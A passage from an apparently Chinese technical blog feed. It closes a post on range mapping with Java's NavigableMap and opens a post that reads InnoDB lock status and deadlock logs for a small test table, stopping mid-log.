class="number">7</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">150</span>, <span class="number">300</span>);</span><br><span class="line">        calculate(values);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">calculate</span><span class="params">(List&lt;Integer&gt; values)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Integer value : values) &#123;</span><br><span class="line">            Entry&lt;Integer, Pair&lt;Integer, Integer&gt;&gt; entry = ranges.floorEntry(value);</span><br><span class="line">            Pair&lt;Integer, Integer&gt; pair = entry.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value &lt; pair.getKey()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;值:&quot;</span> + value + <span class="string">&quot;\t -&gt; 范围:[&quot;</span> + entry.getKey() + <span class="string">&quot;,&quot;</span> + pair.getKey()  + <span class="string">&quot;)\t值:&quot;</span> + pair.getValue());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;值:&quot;</span> + value + <span class="string">&quot;\t -&gt; 未包含的范围&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="执行结果-1"><a href="#执行结果-1" class="headerlink" title="执行结果"></a>执行结果</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">值:2 -&gt; 范围:[0,3)值:0</span><br><span class="line">值:3 -&gt; 未包含的范围</span><br><span class="line">值:7 -&gt; 范围:[5,10)值:1</span><br><span class="line">值:10 -&gt; 未包含的范围</span><br><span class="line">值:100 -&gt; 范围:[100,200)值:2</span><br><span class="line">值:150 -&gt; 范围:[100,200)值:2</span><br><span class="line">值:300 -&gt; 未包含的范围</span><br></pre></td></tr></table></figure><h2 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h2><p>范围映射实现的核心类：java.util.NavigableMap</p><h3 id="1-常用方法"><a href="#1-常用方法" class="headerlink" title="1. 常用方法"></a>1. 常用方法</h3><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>floorEntry</td><td>返回小于等于指定key中的所有key中最大的一个key</td></tr><tr><td>ceilingEntry</td><td>返回大于等于指定key中的所有key中最小的一个key</td></tr><tr><td>lowerEntry</td><td>返回小于指定key中的所有key总最大的一个key</td></tr><tr><td>higherEntry</td><td>返回大于指定key中的所有key中最小的一个key</td></tr></tbody></table><h3 id="2-详解说明"><a href="#2-详解说明" class="headerlink" title="2. 详解说明"></a>2. 详解说明</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">NavigableMap</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">SortedMap</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 获取小于指定key的第一个节点对象</span></span><br><span class="line">    Map.<span class="function">Entry&lt;K, V&gt; <span class="title">lowerEntry</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取小于指定key的第一个key</span></span><br><span class="line">    <span class="function">K <span class="title">lowerKey</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取小于或等于指定key的第一个节点对象</span></span><br><span class="line">    Map.<span class="function">Entry&lt;K, V&gt; <span class="title">floorEntry</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取小于或等于指定key的第一个key</span></span><br><span class="line">    <span class="function">K <span class="title">floorKey</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大于或等于指定key的第一个节点对象</span></span><br><span class="line">    Map.<span class="function">Entry&lt;K, V&gt; <span class="title">ceilingEntry</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大于或等于指定key的第一个key</span></span><br><span class="line">    <span class="function">K <span class="title">ceilingKey</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大于指定key的第一个节点对象</span></span><br><span class="line">    Map.<span class="function">Entry&lt;K, V&gt; <span class="title">higherEntry</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大于指定key的第一个key</span></span><br><span class="line">    <span class="function">K <span class="title">higherKey</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Map的第一个（最小的）节点对象</span></span><br><span class="line">    Map.<span class="function">Entry&lt;K, V&gt; <span class="title">firstEntry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Map的最后一个（最大的）节点对象</span></span><br><span class="line">    Map.<span class="function">Entry&lt;K, V&gt; <span class="title">lastEntry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Map的第一个节点对象，并从Map中移除改节点</span></span><br><span class="line">    Map.<span class="function">Entry&lt;K, V&gt; <span class="title">pollFirstEntry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Map的最后一个节点对象，并从Map中移除改节点</span></span><br><span class="line">    Map.<span class="function">Entry&lt;K, V&gt; <span class="title">pollLastEntry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回当前Map的逆序Map集合</span></span><br><span class="line">    <span class="function">NavigableMap&lt;K, V&gt; <span class="title">descendingMap</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回当前Map中包含的所有key的Set集合</span></span><br><span class="line">    <span class="function">NavigableSet&lt;K&gt; <span class="title">navigableKeySet</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回当前map的逆序Set集合，Set由key组成</span></span><br><span class="line">    <span class="function">NavigableSet&lt;K&gt; <span class="title">descendingKeySet</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回当前map中介于fromKey（fromInclusive是否包含）和toKey（toInclusive是否包含） 之间的子map</span></span><br><span class="line">    <span class="function">NavigableMap&lt;K, V&gt; <span class="title">subMap</span><span class="params">(K fromKey, <span class="keyword">boolean</span> fromInclusive, K toKey, <span class="keyword">boolean</span> toInclusive)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回介于map第一个元素到toKey（inInclusive是否包含）之间的子map</span></span><br><span class="line">    <span class="function">NavigableMap&lt;K, V&gt; <span class="title">headMap</span><span class="params">(K toKey, <span class="keyword">boolean</span> inclusive)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回当前map中介于fromKey（inInclusive是否包含） 到map最后一个元素之间的子map</span></span><br><span class="line">    <span class="function">NavigableMap&lt;K, V&gt; <span class="title">tailMap</span><span class="params">(K fromKey, <span class="keyword">boolean</span> inclusive)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回当前map中介于fromKey（包含）和toKey（不包含）之间的子map</span></span><br><span class="line">    <span class="function">SortedMap&lt;K, V&gt; <span class="title">subMap</span><span class="params">(K fromKey, K toKey)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回介于map第一个元素到toKey（不包含）之间的子map</span></span><br><span class="line">    <span class="function">SortedMap&lt;K, V&gt; <span class="title">headMap</span><span class="params">(K toKey)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回当前map中介于fromKey（包含） 到map最后一个元素之间的子map</span></span><br><span class="line">    <span class="function">SortedMap&lt;K, V&gt; <span class="title">tailMap</span><span class="params">(K fromKey)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><ol><li><a href="http://stackoverflow.com/questions/1314650/using-java-map-for-range-searches/1314708#1314708">Using java map for range searches</a></li><li><a href="http://www.importnew.com/17620.html">给jdk写注释系列之jdk1.6容器(8)：TreeSet、NavigableMap、NavigableSet源码解析</a></li><li><a href="http://my.oschina.net/kevinair/blog/191242">Java集合&lt;10&gt; (NavigableMap)</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/javaee.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h2&gt;&lt;p&gt;近期一个功能开发涉及到一个核心业务规则为：根据消费额实行阶梯计价，额度处于的阶梯档位不同，对应的单价不同，需要根据给定的消费额找到对应的消费单价。&lt;/p&gt;
&lt;h2 id=&quot;二、问题分析&quot;&gt;&lt;a href=&quot;#二、问题分析&quot; class=&quot;headerlink&quot; title=&quot;二、问题分析&quot;&gt;&lt;/a&gt;二、问题分析&lt;/h2&gt;&lt;p&gt;阶梯计价翻译成编码逻辑，先容易想到是一个映射，即：Map。&lt;br&gt;不过特殊的地方在于，这是一个范围映射，将一个范围的键值映射到一个固定的值。&lt;br&gt;下来我们来看一下这种范围映射逻辑如何使用java程序来表现。&lt;/p&gt;
&lt;h2 id=&quot;三、范围映射分类&quot;&gt;&lt;a href=&quot;#三、范围映射分类&quot; class=&quot;headerlink&quot; title=&quot;三、范围映射分类&quot;&gt;&lt;/a&gt;三、范围映射分类&lt;/h2&gt;&lt;p&gt;范围映射按其连续性，可以简单分为如下两类情形：&lt;/p&gt;
&lt;h3 id=&quot;1-连续的范围映射&quot;&gt;&lt;a href=&quot;#1-连续的范围映射&quot; class=&quot;headerlink&quot; title=&quot;1. 连续的范围映射&quot;&gt;&lt;/a&gt;1. 连续的范围映射&lt;/h3&gt;&lt;p&gt;例如：计价阶梯就是连续的范围映射。&lt;br&gt;大多数情况下，计价阶梯都是连续的情况。&lt;/p&gt;
&lt;h4 id=&quot;场景举例&quot;&gt;&lt;a href=&quot;#场景举例&quot; class=&quot;headerlink&quot; title=&quot;场景举例&quot;&gt;&lt;/a&gt;场景举例&lt;/h4&gt;&lt;p&gt;举个大家都熟悉的场景：北京移动套餐外流量资费。这一流量资费在某个时期就是阶梯计价的，消费阶梯是连续的。&lt;br&gt;具体的阶梯计价映射关系如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;流量消费阶梯&lt;/th&gt;
&lt;th&gt;流量单价&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;[0,100MB)&lt;/td&gt;
&lt;td&gt;0.15元/MB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[100MB,500MB)&lt;/td&gt;
&lt;td&gt;0.08元/MB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[500MB,1GB)&lt;/td&gt;
&lt;td&gt;0.05元/MB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[1GB,2GB)&lt;/td&gt;
&lt;td&gt;0.04元/MB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[2GB,15GB)&lt;/td&gt;
&lt;td&gt;0.03元/MB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[15GB,∞)&lt;/td&gt;
&lt;td&gt;0.01元/MB&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>通过InnoDB监控状态分析锁占用</title>
    <link href="http://yeshaoting.cn/article/database/%E9%80%9A%E8%BF%87InnoDB%E7%9B%91%E6%8E%A7%E7%8A%B6%E6%80%81%E5%88%86%E6%9E%90%E9%94%81%E5%8D%A0%E7%94%A8/"/>
    <id>http://yeshaoting.cn/article/database/%E9%80%9A%E8%BF%87InnoDB%E7%9B%91%E6%8E%A7%E7%8A%B6%E6%80%81%E5%88%86%E6%9E%90%E9%94%81%E5%8D%A0%E7%94%A8/</id>
    <published>2016-08-06T14:31:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mysql.png" class="img-logo img-center" /><h2 id="一、表结构"><a href="#一、表结构" class="headerlink" title="一、表结构"></a>一、表结构</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `t` (</span><br><span class="line">  `id` int(11) NOT NULL,</span><br><span class="line">  `stage` int(11) NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  KEY `idx_b` (`stage`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8</span><br></pre></td></tr></table></figure><h2 id="二、表数据"><a href="#二、表数据" class="headerlink" title="二、表数据"></a>二、表数据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------+---------+</span><br><span class="line">|   id |   stage |</span><br><span class="line">|------+---------|</span><br><span class="line">|    1 |       1 |</span><br><span class="line">|    4 |       4 |</span><br><span class="line">|    9 |       9 |</span><br><span class="line">|   15 |      15 |</span><br><span class="line">+------+---------+</span><br></pre></td></tr></table></figure><h2 id="三、简单实例"><a href="#三、简单实例" class="headerlink" title="三、简单实例"></a>三、简单实例</h2><h3 id="1-事务执行时序表"><a href="#1-事务执行时序表" class="headerlink" title="1. 事务执行时序表"></a>1. 事务执行时序表</h3><p>事务(ID:41114)，在索引idx_b值为4上加排他锁。</p><table><thead><tr><th>T1(41114)</th></tr></thead><tbody><tr><td>begin;</td></tr><tr><td>select * from t where stage = 4 for update;</td></tr></tbody></table><h3 id="2-查看InnoDB运行状态"><a href="#2-查看InnoDB运行状态" class="headerlink" title="2. 查看InnoDB运行状态"></a>2. 查看InnoDB运行状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">---TRANSACTION 41114, ACTIVE 41 sec</span><br><span class="line">4 lock struct(s), heap size 1184, 3 row lock(s)</span><br><span class="line">MySQL thread id 39, OS thread handle 0x700000a83000, query id 36756 localhost ::1 root cleaning up</span><br><span class="line">TABLE LOCK table `<span class="built_in">test</span>`.`t` trx id 41114 lock mode IX</span><br><span class="line">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class="built_in">test</span>`.`t` trx id 41114 lock_mode X</span><br><span class="line">Record lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000004; asc     ;;</span><br><span class="line"> 1: len 4; hex 80000004; asc     ;;</span><br><span class="line"></span><br><span class="line">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `<span class="built_in">test</span>`.`t` trx id 41114 lock_mode X locks rec but not gap</span><br><span class="line">Record lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000004; asc     ;;</span><br><span class="line"> 1: len 6; hex 00000000a08b; asc       ;;</span><br><span class="line"> 2: len 7; hex dd000001fa0110; asc        ;;</span><br><span class="line"> 3: len 4; hex 80000004; asc     ;;</span><br><span class="line"></span><br><span class="line">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class="built_in">test</span>`.`t` trx id 41114 lock_mode X locks gap before rec</span><br><span class="line">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000009; asc     ;;</span><br><span class="line"> 1: len 4; hex 80000009; asc     ;;</span><br></pre></td></tr></table></figure><h3 id="3-解读InnoDB运行状态"><a href="#3-解读InnoDB运行状态" class="headerlink" title="3. 解读InnoDB运行状态"></a>3. 解读InnoDB运行状态</h3><p>事务T1总共加了4把锁：1把表，3把行锁。<br>表锁类型：IX</p><p>行锁根据索引划分为加在聚集索引 PRIMARY 上的行锁和加在普通索引 idx_b 上的行锁。<br>加在聚集索引上的行锁1把，是一个排他的记录锁；<br>加在普通索引上的行锁2把，1把是next-key lock，锁住的范围为(1, 4]；1把是gap lock，锁住的范围为(4, 9)。</p><span id="more"></span><h2 id="四、复杂实例"><a href="#四、复杂实例" class="headerlink" title="四、复杂实例"></a>四、复杂实例</h2><p>下面演示一个更加复杂的实例：GAP与Insert Intention冲突引发的死锁，分析死锁时各事务锁占用情况。</p><h3 id="1-事务执行时序表-1"><a href="#1-事务执行时序表-1" class="headerlink" title="1. 事务执行时序表"></a>1. 事务执行时序表</h3><table><thead><tr><th>T1(41121)</th><th>T1(41122)</th></tr></thead><tbody><tr><td>begin;</td><td>begin;</td></tr><tr><td>select * from t where stage = 4 for update;</td><td></td></tr><tr><td></td><td>select * from t where stage = 9 for update;</td></tr><tr><td>insert INTO t values (6, 6)</td><td></td></tr><tr><td></td><td>insert INTO t values (7, 7)</td></tr><tr><td></td><td>(1213, u’Deadlock found when trying to get lock; try restarting transaction’)</td></tr><tr><td>Query OK, 1 row affected</td><td>&nbsp;</td></tr></tbody></table><p>事务T1首先锁住stage=4的记录，然后插入(6, 6)的记录；<br>事务T2首先锁住stage=9的记录，然后插入(7, 7)的记录。</p><h3 id="2-查看InnoDB运行状态-1"><a href="#2-查看InnoDB运行状态-1" class="headerlink" title="2. 查看InnoDB运行状态"></a>2. 查看InnoDB运行状态</h3><p>由于发生死锁后，其中一个事务会回滚，而无法查看到其事务锁占用状态。<br>因此，我们在在事务T2执行记录插入操作之前，查看一下当前各事务锁占用状态。如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">------------</span><br><span class="line">TRANSACTIONS</span><br><span class="line">------------</span><br><span class="line">Trx id counter 41123</span><br><span class="line">Purge <span class="keyword">done</span> <span class="keyword">for</span> trx<span class="string">&#x27;s n:o &lt; 41120 undo n:o &lt; 0 state: running but idle</span></span><br><span class="line"><span class="string">History list length 968</span></span><br><span class="line"><span class="string">LIST OF TRANSACTIONS FOR EACH SESSION:</span></span><br><span class="line"><span class="string">---TRANSACTION 0, not started</span></span><br><span class="line"><span class="string">MySQL thread id 67, OS thread handle 0x700000ac7000, query id 37547 localhost ::1 root init</span></span><br><span class="line"><span class="string">show ENGINE innodb status</span></span><br><span class="line"><span class="string">---TRANSACTION 41105, not started</span></span><br><span class="line"><span class="string">MySQL thread id 65, OS thread handle 0x700000b0b000, query id 36363 localhost 127.0.0.1 root cleaning up</span></span><br><span class="line"><span class="string">---TRANSACTION 0, not started</span></span><br><span class="line"><span class="string">MySQL thread id 64, OS thread handle 0x700000b4f000, query id 36362 localhost 127.0.0.1 root cleaning up</span></span><br><span class="line"><span class="string">---TRANSACTION 0, not started</span></span><br><span class="line"><span class="string">MySQL thread id 58, OS thread handle 0x700000a3f000, query id 37546 localhost root cleaning up</span></span><br><span class="line"><span class="string">---TRANSACTION 41122, ACTIVE 26 sec</span></span><br><span class="line"><span class="string">4 lock struct(s), heap size 1184, 3 row lock(s)</span></span><br><span class="line"><span class="string">MySQL thread id 69, OS thread handle 0x700000bd7000, query id 37534 localhost ::1 root cleaning up</span></span><br><span class="line"><span class="string">TABLE LOCK table `test`.`t` trx id 41122 lock mode IX</span></span><br><span class="line"><span class="string">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X</span></span><br><span class="line"><span class="string">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span></span><br><span class="line"><span class="string"> 0: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"> 1: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41122 lock_mode X locks rec but not gap</span></span><br><span class="line"><span class="string">Record lock, heap no 7 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</span></span><br><span class="line"><span class="string"> 0: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"> 1: len 6; hex 00000000a08b; asc       ;;</span></span><br><span class="line"><span class="string"> 2: len 7; hex dd000001fa011d; asc        ;;</span></span><br><span class="line"><span class="string"> 3: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X locks gap before rec</span></span><br><span class="line"><span class="string">Record lock, heap no 9 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span></span><br><span class="line"><span class="string"> 0: len 4; hex 8000000f; asc     ;;</span></span><br><span class="line"><span class="string"> 1: len 4; hex 8000000f; asc     ;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">---TRANSACTION 41121, ACTIVE 34 sec inserting</span></span><br><span class="line"><span class="string">mysql tables in use 1, locked 1</span></span><br><span class="line"><span class="string">LOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1</span></span><br><span class="line"><span class="string">MySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update</span></span><br><span class="line"><span class="string">insert INTO t values (6, 6)</span></span><br><span class="line"><span class="string">------- TRX HAS BEEN WAITING 21 SEC FOR THIS LOCK TO BE GRANTED:</span></span><br><span class="line"><span class="string">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</span></span><br><span class="line"><span class="string">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span></span><br><span class="line"><span class="string"> 0: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"> 1: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------------------</span></span><br><span class="line"><span class="string">TABLE LOCK table `test`.`t` trx id 41121 lock mode IX</span></span><br><span class="line"><span class="string">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X</span></span><br><span class="line"><span class="string">Record lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span></span><br><span class="line"><span class="string"> 0: len 4; hex 80000004; asc     ;;</span></span><br><span class="line"><span class="string"> 1: len 4; hex 80000004; asc     ;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41121 lock_mode X locks rec but not gap</span></span><br><span class="line"><span class="string">Record lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</span></span><br><span class="line"><span class="string"> 0: len 4; hex 80000004; asc     ;;</span></span><br><span class="line"><span class="string"> 1: len 6; hex 00000000a08b; asc       ;;</span></span><br><span class="line"><span class="string"> 2: len 7; hex dd000001fa0110; asc        ;;</span></span><br><span class="line"><span class="string"> 3: len 4; hex 80000004; asc     ;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec</span></span><br><span class="line"><span class="string">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span></span><br><span class="line"><span class="string"> 0: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"> 1: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</span></span><br><span class="line"><span class="string">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span></span><br><span class="line"><span class="string"> 0: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"> 1: len 4; hex 80000009; asc     ;;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="3-死锁日志"><a href="#3-死锁日志" class="headerlink" title="3. 死锁日志"></a>3. 死锁日志</h3><p>事务T2执行记录插入操作，发生死锁。<br>死锁日志如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">------------------------</span><br><span class="line">LATEST DETECTED DEADLOCK</span><br><span class="line">------------------------</span><br><span class="line">2016-08-04 13:39:05 700000bd7000</span><br><span class="line">*** (1) TRANSACTION:</span><br><span class="line">TRANSACTION 41121, ACTIVE 54 sec inserting</span><br><span class="line">mysql tables <span class="keyword">in</span> use 1, locked 